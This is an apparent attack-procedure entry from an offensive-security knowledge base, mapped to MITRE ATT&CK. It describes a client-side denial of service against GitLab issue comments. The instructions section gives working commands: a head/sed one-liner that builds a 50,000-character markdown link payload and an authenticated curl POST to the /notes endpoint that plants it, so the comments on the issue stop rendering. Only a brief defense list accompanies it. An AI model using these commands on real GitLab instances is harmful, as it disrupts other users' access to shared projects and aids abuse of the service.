---
tags:
  - dos
  - client-side
type: procedure
tools:
  - '[[tools/Curl-HTTP-Client]]'
  - '[[tools/Sed-Stream-Editor]]'
  - '[[tools/Head-File-Extractor]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/head-sed-generate-payload]]'
  - '[[commands/curl-post-large-comment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:55.999Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques:
  - '[[OS Exhaustion Flood]]'
id: f94658ff-b10b-4cf3-8630-27a10dfc28b6
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Trigger-Client-Side-DoS-with-Large-Comment

## Summary

This procedure exploits the lack of character limits in GitLab issue comments by posting a 50,000-character markdown payload, causing browser rendering failures and making comments inaccessible on reload.

## Description

Targeted at GitLab's issue comment endpoint (/notes), this attack uses oversized markdown like repeated [a](/a/a/...) to overwhelm client-side JavaScript rendering. It can be done via UI or direct HTTP POST. Prerequisites include an existing issue and authenticated session. Outcomes: local DoS for the attacker/viewer, with error on fetch.

## Requirements

1. Authenticated GitLab session (CSRF token and _gitlab_session cookie)
2. Issue ID from setup
3. Tools for payload generation and HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement character limits (e.g., 10,000 chars) on comments
- Sanitize/validate markdown input
- Monitor for large POST payloads to /notes

## Objectives

1. Post oversized comment to trigger rendering crash
2. Verify client-side inaccessibility
3. Demonstrate local DoS impact

## Instructions

### Step 1: Generate Large Payload

**Context**: Create 50,000-char string for the comment body.

**Command** ([[commands/head-sed-generate-payload]]):
```bash
head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g'
```

> Outputs string of 50,000 '/a' chars; wrap as '[a]($payload)' for markdown link.

### Step 2: Post Large Comment

**Context**: Submit via HTTP to bypass UI limits if needed.

**Command** ([[commands/curl-post-large-comment]]):
```bash
curl --insecure --silent --output /dev/null ${ProjectURL}/notes?target_id=${targetID}&target_type=issue --header 'Host: ${gitlabHost}' --header 'X-CSRF-Token: [PLACEHOLDER]' -b '_gitlab_session=[PLACEHOLDER]' --data-binary 'note[noteable_type]=Issue&note[noteable_id]=3&note[note]=${payload}&merge_request_diff_head_sha=undefined'
```

> 200 response; comment added but unrenderable.

### Step 3: Reload Issue Page

**Context**: Confirm DoS effect.

No command; refresh browser.

> Error: 'Something went wrong while fetching comments.'

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques

- [[OS Exhaustion Flood]] OS Exhaustion Floods

## Commands Used

- [[commands/head-sed-generate-payload]]
- [[commands/curl-post-large-comment]]

## Tools Used

- [[tools/Curl-HTTP-Client]]
- [[tools/Sed-Stream-Editor]]
- [[tools/Head-File-Extractor]]

## Tags

- dos
- client-side
